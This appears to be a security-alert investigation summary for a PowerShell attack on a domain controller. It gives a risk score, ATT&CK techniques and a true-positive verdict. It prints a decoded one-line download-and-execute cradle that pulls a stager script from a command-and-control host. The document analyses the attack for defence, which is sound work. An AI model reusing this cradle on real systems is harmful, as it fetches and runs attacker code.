## Investigation Summary

### Alert Classification and Severity Assessment
- **Alert Type:** High severity PowerShell-based defense evasion attack
- **Risk Score:** 87/100
- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
- **Affected System:** Domain Controller (DC01.corp.widgets-inc.com)

### Decoded PowerShell Command
The base64 encoded command decodes to:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
```
This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.

1. **IP Address (198.51.100.99):** LOW - Reserved test IP, should not exist in production

### Overall Verdict: **TRUE POSITIVE**

Despite the use of a test IP address, this represents a genuine security incident because:

1. **Malicious Intent:** The PowerShell command demonstrates clear malicious intent to download and execute remote code
2. **Attack Techniques:** Uses multiple evasion techniques (encoded commands, execution policy bypass, hidden window)
3. **Target System:** Executed on a critical domain controller
4. **C2 Infrastructure:** Attempts to contact suspicious command-and-control infrastructure
